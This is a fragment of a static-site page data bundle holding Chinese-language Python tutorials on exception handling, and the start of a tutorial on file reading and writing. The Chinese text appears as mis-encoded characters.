print("hahhahaha")\nprint("end")\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# returnè¯­å¥åå¼å¸¸å¤ç\n\nreturnè¯­å¥æä¸¤ç§ä½ç¨ï¼ç»ææ¹æ³è¿è¡åè¿åå¼ãæä»¬ä¸è¬ä¸ä¼æreturnè¯­å¥æ¾å°å¼å¸¸å¤ççç»æä¸­ï¼éå¸¸æ¾å°æ¹æ³æåã\n\n\n# å¸¸è§å¼å¸¸æ±æ»\n\nå¼å¸¸åç§°                        è¯´æ\nArithmeticError             æææ°å¼è®¡ç®éè¯¯çåºç±»\nAssertionError              æ­è¨è¯­å¥å¤±è´¥\nAttributeError              å¯¹è±¡æ²¡æè¿ä¸ªå±æ§\nBaseException               ææå¼å¸¸çåºç±»\nDeprecationWarning          å³äºè¢«å¼ç¨çç¹å¾çè­¦å\nEnvironmentError            æä½ç³»ç»éè¯¯çåºç±»\nEOFError                    æ²¡æåå»ºè¾å¥,å°è¾¾ EOF æ è®°\nException                   å¸¸è§éè¯¯çåºç±»\nFloatingPointError          æµ®ç¹è®¡ç®éè¯¯\nFutureWarning               å³äºæé å°æ¥è¯­ä¹ä¼ææ¹åçè­¦å\nGeneratorExit               çæå¨(generator)åçå¼å¸¸æ¥éç¥éåº\nImportError                 å¯¼å¥æ¨¡å/å¯¹è±¡å¤±è´¥\nIndentationError            ç¼©è¿éè¯¯\nIndexError                  åºåä¸­æ²¡ææ­¤ç´¢å¼(index)\nIOError                     è¾å¥/è¾åºæä½å¤±è´¥\nKeyboardInterrupt           ç¨æ·ä¸­æ­æ§è¡(éå¸¸æ¯è¾å¥^C)\nKeyError                    æ å°ä¸­æ²¡æè¿ä¸ªé®\nLookupError                 æ ææ°æ®æ¥è¯¢çåºç±»\nMemoryError                 åå­æº¢åºéè¯¯(å¯¹äº Python è§£éå¨ä¸æ¯è´å½ç)\nNameError                   æªå£°æ/åå§åå¯¹è±¡ (æ²¡æå±æ§)\nNotImplementedError         å°æªå®ç°çæ¹æ³\nOSError                     æä½ç³»ç»éè¯¯\nOverflowError               æ°å¼è¿ç®è¶åºæå¤§éå¶\nOverflowWarning             æ§çå³äºèªå¨æåä¸ºé¿æ´å(long)çè­¦å\nPendingDeprecationWarning   å³äºç¹æ§å°ä¼è¢«åºå¼çè­¦å\nReferenceError              å¼±å¼ç¨(Weak reference)è¯å¾è®¿é®å·²ç»åå¾åæ¶äºçå¯¹è±¡\nRuntimeError                ä¸è¬çè¿è¡æ¶éè¯¯\nRuntimeWarning              å¯ççè¿è¡æ¶è¡ä¸º(runtime behavior)çè­¦å\nStandardError               ææçåå»ºæ åå¼å¸¸çåºç±»\nStopIteration               è¿­ä»£å¨æ²¡ææ´å¤çå¼\nSyntaxError                 Python è¯­æ³éè¯¯\nSyntaxWarning               å¯ççè¯­æ³çè­¦å\nSystemError                 ä¸è¬çè§£éå¨ç³»ç»éè¯¯\nSystemExit                  è§£éå¨è¯·æ±éåº\nTabError                    Tab åç©ºæ ¼æ··ç¨\nTypeError                   å¯¹ç±»åæ æçæä½\nUnboundLocalError           è®¿é®æªåå§åçæ¬å°åé\nUnicodeDecodeError          Unicode è§£ç æ¶çéè¯¯\nUnicodeEncodeError          Unicode ç¼ç æ¶éè¯¯\nUnicodeError                Unicode ç¸å³çéè¯¯\nUnicodeTranslateError       Unicode è½¬æ¢æ¶éè¯¯\nUserWarning                 ç¨æ·ä»£ç çæçè­¦å\nValueError                  ä¼ å¥æ æçåæ°\nWarning                     è­¦åçåºç±»\nWindowsError                ç³»ç»è°ç¨å¤±è´¥\nZeroDivisionError           é¤(æåæ¨¡)é¶ (æææ°æ®ç±»å)\n\n\n# withä¸ä¸æç®¡ç\n\nfinallyåç±äºå¨æ¯å¦åçå¼å¸¸é½ä¼æ§è¡ï¼éå¸¸ç¨æ¥éæ¾èµæºä»£ç ï¼æä»¬ä¹å¯ä»¥éè¿withè¿è¡ä¸ä¸æçç®¡çï¼æ´æ¹ä¾¿å®ç°èµæºçéæ¾ã\n\nwithä¸ä¸æç®¡çå¯ä»¥èªå¨çç®¡çèµæºï¼å¨withä»£ç åæ§è¡å®æä¹åï¼èªå¨è¿åè¿å¥ä»£ç ä¹åçä¸ä¸æï¼ä¸ç®¡æ¯å ä¸ºä»ä¹åå è·³åºäºwithï¼æ»è½ä¿è¯èµæºçåæ¶éæ¾ã\n\nwithçä½¿ç¨æ¹æ³å¦ä¸æç¤ºï¼\n\nwith open("d:/aaa.txt") as f:\n  for line in f:\n    print(line)\n\n\n1\n2\n3\n\n\n\n# trackbackæ¨¡å\n\nä½¿ç¨tracebackæ¨¡åå¯ä»¥æå°å¼å¸¸çä¿¡æ¯ã\n\nimport traceback\ntry:\n    print(1/0)\nexcept:\n    traceback.print_exc()\n"""\nTraceback (most recent call last):\n  File "/Users/plankton/Workspace/Py/StudyPy/demo.py", line 942, in <module>\n    print(1/0)\nZeroDivisionError: division by zero\n"""\n\ntry:\n    print("hello")\n    a = 1/0\nexcept:\n    with open("./error.log","a") as f:\n        traceback.print_exc(file=f)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# èªå®ä¹å¼å¸¸ç±»\n\nå¨ç¨åºå¼åä¸­ï¼æä»¬ææ¶åéè¦èªå®ä¹å¼å¸¸çç±»ï¼éå¸¸ç»§æ¿Exceptionå³å¯ï¼å½åä¸ºErrorãExceptionç­ãä¸é¢æ¯ä¸ä¸ªå¼å¸¸ç±»çä¾å­ï¼\n\nclass MyException(Exception):\n    def __init__(self,errorInfo):\n        Exception.__init__(self)\n        self.errorInfo = errorInfo\n    def __str__(self):\n        return str(self.errorInfo)+"hahaha"\n\nif __name__ == \'__main__\':\n    age = int(input("aaa"))\n    if age <1 or age>100:\n        raise MyException("æ¥éäº")\n    else:\n        print("age",age)\n        \n        """\n        aaa123\nTraceback (most recent call last):\n  File "/Users/plankton/Workspace/Py/StudyPy/demo.py", line 970, in <module>\n    raise MyException("æ¥éäº")\n__main__.MyException: æ¥éäºhahaha\n        """\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nå¨ç¨åºä¸­æåºå¼å¸¸å¯ä»¥ä½¿ç¨raise',normalizedContent:'# pythonå¼å¸¸æºå¶çé£äºäº\n\n> å¼å¸¸æ¯ç¨åºå¨è¿è¡è¿ç¨ä¸­ï¼ç±äºç¨æ·è¾å¥æèå¶ä»åå å¯¼è´çç¨åºä¸­åºç°çéæ­£å¸¸çè¿è¡ç°è±¡ãå¼å¸¸å¤çæ¯æç¨åºå¨åºç°é®é¢æ¶ä¾ç¶å¯ä»¥æ­£ç¡®çæ§è¡ä»£ç ï¼ä¸ä¼å ä¸ºå¼å¸¸èç»æ­¢ç¨åºè¿è¡ã\n\npythonä¸­å¼è¿äºå¾å¤ç¨æ¥æè¿°åå¤çå¼å¸¸çç±»ï¼ç§°ä¸ºå¼å¸¸ç±»ï¼å¼å¸¸ç±»å®ä¹ä¸­åå«äºè¯¥å¼å¸¸çä¿¡æ¯åå¤ççæ¹æ³ã\n\néå¯¹å¼å¸¸çå¤çæåº¦åå«ä¸¤ä¸ªæ¹å¼ï¼\n\n * æåºå¼å¸¸ï¼å¨æ§è¡ä¸ä¸ªæ¹æ³æ¶ï¼å¦æåçå¼å¸¸ï¼åè¿ä¸ªæ¹æ³çæä»£è¡¨è¯¥å¼å¸¸çä¸ä¸ªå¯¹è±¡ï¼åæ­¢æ§è¡å½åçæ§è¡è·¯å¾ï¼å¹¶æå¼å¸¸å¯¹è±¡æäº¤ç»è§£éå¨ã\n * æè·å¼å¸¸ï¼è§£éå¨è·å¾å°å¼å¸¸ä¹åï¼å¯»æ¾ç¸å³çä»£ç å¤çå¼å¸¸ã\n\n\n# pythonå¼å¸¸å¤ç\n\n\n# try...exceptç»æ\n\ntry...exceptæ¯æå¸¸è§çå¼å¸¸å¤çæºå¶ï¼åjavaä¸­çtry...catchç±»ä¼¼ãç»æå¦ä¸ï¼\n\ntry:\n    a = 1/0\nexcept baseexception as e:\n    print(e) # division by zero\n\n\n1\n2\n3\n4\n\n\ntryååå«çå¯è½å¼åå¼å¸¸çä»£ç ï¼exceptåç¨äºæè·åå¤çåççå¼å¸¸ãæ§è¡çæ¶åï¼å¦ætryä¸­æ²¡æå¼åå¼å¸¸ï¼åä¸ä¼æ§è¡exceptä¸­çä»£ç ï¼å¦æå¼åäºå¼å¸¸ï¼åä¼è·³è¿å¼å¸¸åçè¯­å¥ï¼æ§è¡exceptä¸­çå¼å¸¸å¤çä»£ç ï¼å¤çå®æä¹åï¼ç»§ç»­è¿è¡try...exceptåç»­ä»£ç ã\n\nåæ¶ï¼å¦æä¸ä¸ªtryä¸­å¯è½åºç°å¤ä¸ªç±»åçå¼å¸¸ï¼å°±å¯ä»¥æ·»å å¤ä¸ªexceptionçexceptãå¦ä¸æç¤ºï¼\n\ntry:\n    a = input("è¯·è¾å¥è¢«é¤æ°ï¼")\n    b = input("è¯·è¾å¥é¤æ°ï¼")\n    c = float(a)/float(b)\n    print(c)\nexcept zerodivisionerror:\n    print("é¤æ°ä¸è½ä¸º0")\nexcept typeerror:\n    print("é¤æ°åè¢«é¤æ°åºè¯¥ä¸ºæ°")\nexcept nameerror:\n    print("åéä¸å­å¨")\nexcept baseexception as e:\n    print(e)\n    print(type(e))\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\ntry...except...elseç»æä¸­å¢å äºä¸ä¸ªelseå¿«ï¼å¦ætryä¸­æ²¡ææåºå¼å¸¸ï¼åæ§è¡elseåï¼å¦ææ§è¡äºexceptåï¼å°±ä¸æ§è¡äºelseåã\n\ntry:\n    a = input("è¯·è¾å¥è¢«é¤æ°ï¼")\n    b = input("è¯·è¾å¥é¤æ°ï¼")\n    c = float(a)/float(b)\n    print(c)\nexcept zerodivisionerror:\n    print("é¤æ°ä¸è½ä¸º0")\nexcept typeerror:\n    print("é¤æ°åè¢«é¤æ°åºè¯¥ä¸ºæ°")\nexcept nameerror:\n    print("åéä¸å­å¨")\nexcept baseexception as e:\n    print(e)\n    print(type(e))\nelse:\n    print("aaa")\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\ntry...except...finallyç»æä¸­ï¼æ è®ºæ¯å¦åçå¼å¸¸é½ä¼æ§è¡finallyä¸­çè¯­å¥ï¼éå¸¸ç¨finallyä¸­çè¯­å¥ç¨æ¥éæ¾èµæºã\n\ntry:\n    a = input("hello")\n    b = input("world")\n    c = float(a)/float(b)\n    print(c)\nexcept baseexception as e:\n    print(e)\nelse:\n    print(c)\nfinally:\n    print("hahhahaha")\nprint("end")\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# returnè¯­å¥åå¼å¸¸å¤ç\n\nreturnè¯­å¥æä¸¤ç§ä½ç¨ï¼ç»ææ¹æ³è¿è¡åè¿åå¼ãæä»¬ä¸è¬ä¸ä¼æreturnè¯­å¥æ¾å°å¼å¸¸å¤ççç»æä¸­ï¼éå¸¸æ¾å°æ¹æ³æåã\n\n\n# å¸¸è§å¼å¸¸æ±æ»\n\nå¼å¸¸åç§°                        è¯´æ\narithmeticerror             æææ°å¼è®¡ç®éè¯¯çåºç±»\nassertionerror              æ­è¨è¯­å¥å¤±è´¥\nattributeerror              å¯¹è±¡æ²¡æè¿ä¸ªå±æ§\nbaseexception               ææå¼å¸¸çåºç±»\ndeprecationwarning          å³äºè¢«å¼ç¨çç¹å¾çè­¦å\nenvironmenterror            æä½ç³»ç»éè¯¯çåºç±»\neoferror                    æ²¡æåå»ºè¾å¥,å°è¾¾ eof æ è®°\nexception                   å¸¸è§éè¯¯çåºç±»\nfloatingpointerror          æµ®ç¹è®¡ç®éè¯¯\nfuturewarning               å³äºæé å°æ¥è¯­ä¹ä¼ææ¹åçè­¦å\ngeneratorexit               çæå¨(generator)åçå¼å¸¸æ¥éç¥éåº\nimporterror                 å¯¼å¥æ¨¡å/å¯¹è±¡å¤±è´¥\nindentationerror            ç¼©è¿éè¯¯\nindexerror                  åºåä¸­æ²¡ææ­¤ç´¢å¼(index)\nioerror                     è¾å¥/è¾åºæä½å¤±è´¥\nkeyboardinterrupt           ç¨æ·ä¸­æ­æ§è¡(éå¸¸æ¯è¾å¥^c)\nkeyerror                    æ å°ä¸­æ²¡æè¿ä¸ªé®\nlookuperror                 æ ææ°æ®æ¥è¯¢çåºç±»\nmemoryerror                 åå­æº¢åºéè¯¯(å¯¹äº python è§£éå¨ä¸æ¯è´å½ç)\nnameerror                   æªå£°æ/åå§åå¯¹è±¡ (æ²¡æå±æ§)\nnotimplementederror         å°æªå®ç°çæ¹æ³\noserror                     æä½ç³»ç»éè¯¯\noverflowerror               æ°å¼è¿ç®è¶åºæå¤§éå¶\noverflowwarning             æ§çå³äºèªå¨æåä¸ºé¿æ´å(long)çè­¦å\npendingdeprecationwarning   å³äºç¹æ§å°ä¼è¢«åºå¼çè­¦å\nreferenceerror              å¼±å¼ç¨(weak reference)è¯å¾è®¿é®å·²ç»åå¾åæ¶äºçå¯¹è±¡\nruntimeerror                ä¸è¬çè¿è¡æ¶éè¯¯\nruntimewarning              å¯ççè¿è¡æ¶è¡ä¸º(runtime behavior)çè­¦å\nstandarderror               ææçåå»ºæ åå¼å¸¸çåºç±»\nstopiteration               è¿­ä»£å¨æ²¡ææ´å¤çå¼\nsyntaxerror                 python è¯­æ³éè¯¯\nsyntaxwarning               å¯ççè¯­æ³çè­¦å\nsystemerror                 ä¸è¬çè§£éå¨ç³»ç»éè¯¯\nsystemexit                  è§£éå¨è¯·æ±éåº\ntaberror                    tab åç©ºæ ¼æ··ç¨\ntypeerror                   å¯¹ç±»åæ æçæä½\nunboundlocalerror           è®¿é®æªåå§åçæ¬å°åé\nunicodedecodeerror          unicode è§£ç æ¶çéè¯¯\nunicodeencodeerror          unicode ç¼ç æ¶éè¯¯\nunicodeerror                unicode ç¸å³çéè¯¯\nunicodetranslateerror       unicode è½¬æ¢æ¶éè¯¯\nuserwarning                 ç¨æ·ä»£ç çæçè­¦å\nvalueerror                  ä¼ å¥æ æçåæ°\nwarning                     è­¦åçåºç±»\nwindowserror                ç³»ç»è°ç¨å¤±è´¥\nzerodivisionerror           é¤(æåæ¨¡)é¶ (æææ°æ®ç±»å)\n\n\n# withä¸ä¸æç®¡ç\n\nfinallyåç±äºå¨æ¯å¦åçå¼å¸¸é½ä¼æ§è¡ï¼éå¸¸ç¨æ¥éæ¾èµæºä»£ç ï¼æä»¬ä¹å¯ä»¥éè¿withè¿è¡ä¸ä¸æçç®¡çï¼æ´æ¹ä¾¿å®ç°èµæºçéæ¾ã\n\nwithä¸ä¸æç®¡çå¯ä»¥èªå¨çç®¡çèµæºï¼å¨withä»£ç åæ§è¡å®æä¹åï¼èªå¨è¿åè¿å¥ä»£ç ä¹åçä¸ä¸æï¼ä¸ç®¡æ¯å ä¸ºä»ä¹åå è·³åºäºwithï¼æ»è½ä¿è¯èµæºçåæ¶éæ¾ã\n\nwithçä½¿ç¨æ¹æ³å¦ä¸æç¤ºï¼\n\nwith open("d:/aaa.txt") as f:\n  for line in f:\n    print(line)\n\n\n1\n2\n3\n\n\n\n# trackbackæ¨¡å\n\nä½¿ç¨tracebackæ¨¡åå¯ä»¥æå°å¼å¸¸çä¿¡æ¯ã\n\nimport traceback\ntry:\n    print(1/0)\nexcept:\n    traceback.print_exc()\n"""\ntraceback (most recent call last):\n  file "/users/plankton/workspace/py/studypy/demo.py", line 942, in <module>\n    print(1/0)\nzerodivisionerror: division by zero\n"""\n\ntry:\n    print("hello")\n    a = 1/0\nexcept:\n    with open("./error.log","a") as f:\n        traceback.print_exc(file=f)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# èªå®ä¹å¼å¸¸ç±»\n\nå¨ç¨åºå¼åä¸­ï¼æä»¬ææ¶åéè¦èªå®ä¹å¼å¸¸çç±»ï¼éå¸¸ç»§æ¿exceptionå³å¯ï¼å½åä¸ºerrorãexceptionç­ãä¸é¢æ¯ä¸ä¸ªå¼å¸¸ç±»çä¾å­ï¼\n\nclass myexception(exception):\n    def __init__(self,errorinfo):\n        exception.__init__(self)\n        self.errorinfo = errorinfo\n    def __str__(self):\n        return str(self.errorinfo)+"hahaha"\n\nif __name__ == \'__main__\':\n    age = int(input("aaa"))\n    if age <1 or age>100:\n        raise myexception("æ¥éäº")\n    else:\n        print("age",age)\n        \n        """\n        aaa123\ntraceback (most recent call last):\n  file "/users/plankton/workspace/py/studypy/demo.py", line 970, in <module>\n    raise myexception("æ¥éäº")\n__main__.myexception: æ¥éäºhahaha\n        """\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nå¨ç¨åºä¸­æåºå¼å¸¸å¯ä»¥ä½¿ç¨raise',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"Pythonæä»¶æä½çé£äºäº",frontmatter:{title:"Pythonæä»¶æä½çé£äºäº",date:"2022-03-26T23:00:00.000Z",permalink:"/sec/dev/python/file",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å®å¨å¼å","Python"],tags:["Python"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/202.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/2020.Python/06.Python%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.html",relativePath:"02.å®å¨/202.å®å¨å¼å/2020.Python/06.Pythonæä»¶æä½çé£äºäº.md",key:"v-eadc1a9a",path:"/sec/dev/python/file/",headers:[{level:2,title:"ææ¬æä»¶åäºè¿å¶æä»¶",slug:"ææ¬æä»¶åäºè¿å¶æä»¶",normalizedTitle:"ææ¬æä»¶åäºè¿å¶æä»¶",charIndex:126},{level:2,title:"æä»¶æä½æ¨¡åç®ä»",slug:"æä»¶æä½æ¨¡åç®ä»",normalizedTitle:"æä»¶æä½æ¨¡åç®ä»",charIndex:297},{level:2,title:"åå»ºæä»¶å¯¹è±¡",slug:"åå»ºæä»¶å¯¹è±¡",normalizedTitle:"åå»ºæä»¶å¯¹è±¡",charIndex:843},{level:2,title:"ææ¬æä»¶å¤ç",slug:"ææ¬æä»¶å¤ç",normalizedTitle:"ææ¬æä»¶å¤ç",charIndex:1197},{level:3,title:"ææ¬æä»¶çåå¥",slug:"ææ¬æä»¶çåå¥",normalizedTitle:"ææ¬æä»¶çåå¥",charIndex:1208},{level:3,title:"ææ¬æä»¶çè¯»å",slug:"ææ¬æä»¶çè¯»å",normalizedTitle:"ææ¬æä»¶çè¯»å",charIndex:2057},{level:2,title:"äºè¿å¶æä»¶çå¤ç",slug:"äºè¿å¶æä»¶çå¤ç",normalizedTitle:"äºè¿å¶æä»¶çå¤ç",charIndex:2909},{level:2,title:"æä»¶å¯¹è±¡çå±æ§åæ¹æ³",slug:"æä»¶å¯¹è±¡çå±æ§åæ¹æ³",normalizedTitle:"æä»¶å¯¹è±¡çå±æ§åæ¹æ³",charIndex:2965},{level:2,title:"ä»»æä½ç½®æä½æä»¶",slug:"ä»»æä½ç½®æä½æä»¶",normalizedTitle:"ä»»æä½ç½®æä½æä»¶",charIndex:3943},{level:2,title:"pickleåºåå",slug:"pickleåºåå",normalizedTitle:"pickleåºåå",charIndex:4225},{level:2,title:"CSVæä»¶æä½",slug:"csvæä»¶æä½",normalizedTitle:"csvæä»¶æä½",charIndex:4949},{level:2,title:"osåos.pathæ¨¡å",slug:"osåos-pathæ¨¡å",normalizedTitle:"osåos.pathæ¨¡å",charIndex:5540},{level:3,title:"osæ¨¡å",slug:"osæ¨¡å",normalizedTitle:"osæ¨¡å",charIndex:5554},{level:3,title:"osæ¨¡åæä½æä»¶",slug:"osæ¨¡åæä½æä»¶",normalizedTitle:"osæ¨¡åæä½æä»¶",charIndex:6345},{level:3,title:"os.pathæ¨¡å",slug:"os-pathæ¨¡å",normalizedTitle:"os.pathæ¨¡å",charIndex:5543},{level:3,title:"walkéå½éåææçæä»¶åç®å½",slug:"walkéå½éåææçæä»¶åç®å½",normalizedTitle:"walkéå½éåææçæä»¶åç®å½",charIndex:8217},{level:2,title:"shutilæ¨¡å æ·è´ååç¼©",slug:"shutilæ¨¡å-æ·è´ååç¼©",normalizedTitle:"shutilæ¨¡å æ·è´ååç¼©",charIndex:9558}],excerpt:'<h1 id="pythonæä»¶æä½çé£äºäº"><a class="header-anchor" href="#pythonæä»¶æä½çé£äºäº">#</a> Pythonæä»¶æä½çé£äºäº</h1>\n<blockquote>\n<p>æä»¶æ¯æ°æ®æä¹åçä¸ç§éè¦çä»è´¨ï¼éè¿æä»¶çè¯»åï¼å¯ä»¥å°ç¨åºè¿è¡çæ°æ®ä¿å­å°ç¡¬çä¸ï¼å¹¶å¯ä»¥å¨ä¸ä¸æ¬¡è¿è¡ç¨åºçæ¶ï¼æ¢å¤ä¹åçæ°æ®ãå¾å¤è½¯ä»¶ç³»ç»æ¯å°æ°æ®å­å¨å°æ°æ®åºä¸­ï¼èæ°æ®åºå®éä¸ä¹æ¯åºäºæä»¶å½¢å¼å­å¨çã</p>\n</blockquote>\n',headersStr:"ææ¬æä»¶åäºè¿å¶æä»¶ æä»¶æä½æ¨¡åç®ä» åå»ºæä»¶å¯¹è±¡ ææ¬æä»¶å¤ç ææ¬æä»¶çåå¥ ææ¬æä»¶çè¯»å äºè¿å¶æä»¶çå¤ç æä»¶å¯¹è±¡çå±æ§åæ¹æ³ ä»»æä½ç½®æä½æä»¶ pickleåºåå CSVæä»¶æä½ osåos.pathæ¨¡å osæ¨¡å osæ¨¡åæä½æä»¶ os.pathæ¨¡å walkéå½éåææçæä»¶åç®å½ shutilæ¨¡å æ·è´ååç¼©",content:'# Pythonæä»¶æä½çé£äºäº\n\n> æä»¶æ¯æ°æ®æä¹åçä¸ç§éè¦çä»è´¨ï¼éè¿æä»¶çè¯»åï¼å¯ä»¥å°ç¨åºè¿è¡çæ°æ®ä¿å­å°ç¡¬çä¸ï¼å¹¶å¯ä»¥å¨ä¸ä¸æ¬¡è¿è¡ç¨åºçæ¶ï¼æ¢å¤ä¹åçæ°æ®ãå¾å¤è½¯ä»¶ç³»ç»æ¯å°æ°æ®å­å¨å°æ°æ®åºä¸­ï¼èæ°æ®åºå®éä¸ä¹æ¯åºäºæä»¶å½¢å¼å­å¨çã\n\n\n# ææ¬æä»¶åäºè¿å¶æä»¶\n\næç§æä»¶çæ°æ®ç»ç»å½¢å¼ï¼æ¶ææä»¶åä¸ºææ¬æä»¶åäºè¿å¶æä»¶ä¸¤ç§ã\n\n 1. ææ¬æä»¶\n    \n    å­å¨æ®éçå­ç¬¦ææ¬ï¼Pythonä¸­é»è®¤ä½¿ç¨unicodeï¼ä¸ä¸ªå­ç¬¦å ç¨ä¸¤ä¸ªå­èï¼å¯è¡¨ç¤º65536ä¸ªå­ç¬¦ã\n\n 2. äºè¿å¶æä»¶\n    \n    äºè¿å¶æä»¶ææ°æ®åå®¹å®ç¨å­èå­å¨ãæ æ³ç´æ¥ä½¿ç¨ææ¬å·¥å·æå¼ã\n\n\n# æä»¶æä½æ¨¡åç®ä»\n\nPythonæ ååºä¸­å­å¨å¤§éçæä»¶æä½ç¸å³çæ¨¡åï¼å¦ä¸è¡¨æç¤ºï¼\n\nåç§°                              è¯´æ\nio æ¨¡å                           æä»¶æµçè¾å¥åè¾åºæä½ inputoutput\nos æ¨¡å                           åºæ¬æä½ç³»ç»åè½ï¼åæ¬æä»¶æä½\nglob æ¨¡å                         æ¥æ¾ç¬¦åç¹å®è§åçæä»¶è·¯å¾å\nfnmatch æ¨¡å                      ä½¿ç¨æ¨¡å¼æ¥å¹éæä»¶è·¯å¾å\nfileinput æ¨¡å                    å¤çå¤ä¸ªè¾å¥æä»¶\nfilecmp æ¨¡å                      ç¨äºæä»¶çæ¯è¾\ncvs æ¨¡å                          ç¨äº csv æä»¶å¤ç\npickle å cPickle                ç¨äºåºåååååºåå\nxml å                           ç¨äº XML æ°æ®å¤ç\nbz2ãgzipãzipfileãzlibãtarfile   ç¨äºå¤çåç¼©åè§£åç¼©æä»¶ï¼åå«å¯¹åºä¸åçç®æ³ï¼\n\n\n# åå»ºæä»¶å¯¹è±¡\n\næä»¬ä½¿ç¨openåå»ºä¸ä¸ªæä»¶å¯¹è±¡ï¼åå»ºçæ¹å¼å¦ä¸é¢çä¾å­æç¤ºï¼æä»¶è·¯å¾å¯ä»¥æ¯å¨è·¯å¾æèç¸å¯¹è·¯å¾ãå ä¸ºè·¯å¾åéç¬¦æ¶åå°è½¬ä¹çé®é¢ï¼å¯ä»¥ä½¿ç¨åå§å­ç¬¦ä¸²ï¼å­ç¬¦ä¸²åé¢å ä¸ä¸ªrï¼è¡¨ç¤ºè·¯å¾ï¼\n\nwith open(r"./error.log","w") as f:\n\n\n1\n\n\næä»¶çæå¼æ¹å¼æä¸é¢çå ç§ï¼\n\næ¨¡å¼   æè¿°\nr    è¯» read æ¨¡å¼\nw    å write æ¨¡å¼ãå¦ææä»¶ä¸å­å¨ååå»ºï¼å¦ææä»¶å­å¨ï¼åéåæ°åå®¹ï¼\na    è¿½å  append æ¨¡å¼ãå¦ææä»¶ä¸å­å¨ååå»ºï¼å¦ææä»¶å­å¨ï¼åå¨æä»¶æ«å°¾è¿½å åå®¹\nb    äºè¿å¶ binary æ¨¡å¼ï¼å¯ä¸å¶ä»æ¨¡å¼ç»åä½¿ç¨ï¼\n+    è¯»ãåæ¨¡å¼ï¼å¯ä¸å¶ä»æ¨¡å¼ç»åä½¿ç¨ï¼\n\nè¥ææä»¬æ²¡æå¢å bï¼åé»è®¤å¤ççäºææ¬æä»¶çå¯¹è±¡ã\n\n\n# ææ¬æä»¶å¤ç\n\n\n# ææ¬æä»¶çåå¥\n\nææ¬æä»¶çåå¥åå«ä¸ä¸ªæ­¥éª¤ï¼\n\n 1. åå»ºææ¬æä»¶å¯¹è±¡\n 2. åå¥æ°æ®\n 3. å³é­æä»¶å¯¹è±¡\n\nä¾å­ï¼\n\nf = open(r"aaa.txt","a")\ns = "abcd\\nabcd\\t\\thello"\nf.write(s)\nf.close()\n\n\n1\n2\n3\n4\n\n\n# ç¼ç æ ¼å¼\n\nå¨æææ¬çæ¶åï¼å¦æä¸æ³¨æç¼ç æ ¼å¼çé®é¢ï¼ç»å¸¸ä¼ç¢°å°ä¹±ç çé®é¢ï¼ä¸é¢ç®åçä¸ä¸å ç§ç¼ç æ ¼å¼çå³ç³»ã\n\n\n\n# ä¸­æä¹±ç é®é¢\n\nWindowsé»è®¤çç¼ç æ ¼å¼äºGBKï¼Linuxé»è®¤çç¼ç æ ¼å¼æ¯UTF-8ï¼æä»¬ä½¿ç¨openæå¼æä»¶æ¶ï¼é»è®¤ä½¿ç¨çæ¯ç³»ç»ç¼ç ãæä»¬å¯ä»¥éè¿æå®æä»¶ç¼ç çæ ¼å¼è§£å³ä¸­æçä¹±ç é®é¢ã\n\nf = open(r"aaa.txt","a",encoding="uft-8")\n\n\n1\n\n\n# ä½¿ç¨writeæèwritelineåå¥æ°æ®\n\nwriteæ¯å°åæ°å­ç¬¦ä¸²åå¥å°æä»¶ä¸­ï¼writelinesæ¯å°å­ç¬¦ä¸²åè¡¨åå¥ä¸ºé¾ä¸­ï¼å¹¶åä¸æ·»å æ¢è¡ç¬¦ã\n\nf = open(r"./bbb.txt","w",encoding="utf-8")\ns = ["aa\\n","bb\\n"]\n# f.write(s)\nf.writelines(s)\n\n\n1\n2\n3\n4\n\n\n# closeå³é­æä»¶æµ\n\nç±äºæä»¶åºå±æ¯ææä½ç³»ç»æ§å¶çï¼å æ­¤æä»¬æå¼çæä»¶å¯¹è±¡éè¦æ¾ç¤ºè°ç¨closeæ¹æ³å³é­æä»¶å¯¹è±¡ãå½è°ç¨äºcloseæ¹æ³æ¶ï¼é¦åä¼æç¼å²åºçæ°æ®åå¥å°æä»¶ä¸­ï¼ç¶åå³é­æä»¶ï¼éæ¾å¯¹è±¡ãéå¸¸æåµä¸æä»¬å°closeåå°finallyéé¢æèéåwithä½¿ç¨ã\n\nwith open(r"ccc.txt","w") as f:\n    f.write("helloworld")\n\ntry:\n    f = open(r"helloworld.txt","w")\n    f.write("ehahah")\nfinally:\n    f.close()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# ææ¬æä»¶çè¯»å\n\nææ¬æä»¶çè¯»åä¸è¬ä½¿ç¨å¦ä¸çå ç§æ¹å¼ï¼\n\n 1. read([size])\n    \n    è¯»åæå®é¿åº¦çå­ç¬¦ï¼å¹¶ä¸è¿åç»æï¼å¦ææ²¡ææå®å­ç¬¦é¿åº¦ï¼å°±ä¼è¯»åæ´ä¸ªæä»¶ï¼\n\n 2. readline()\n    \n    ä»¥è¡ä¸ºåä½è¯»åç»æå¹¶è¿åï¼è¯»åå°æåä¼è¿åç©ºä¸²\n\n 3. readlines()\n    \n    ææ¬æä»¶ä¸­çæ¯ä¸è¡ä½ä¸ºä¸ä¸ªå­ç¬¦ä¸²å­å¥åè¡¨ï¼æåè¿åä¸ä¸ªåè¡¨\n\n# è¯»ååä¸ªå­ç¬¦\nwith open(r"helloworld.txt","r") as f:\n    print(f.read(4))\n\n# è¯»åå¨é¨åå®¹\nwith open(r"helloworld.txt","r") as f:\n    print(f.read())\n\n# 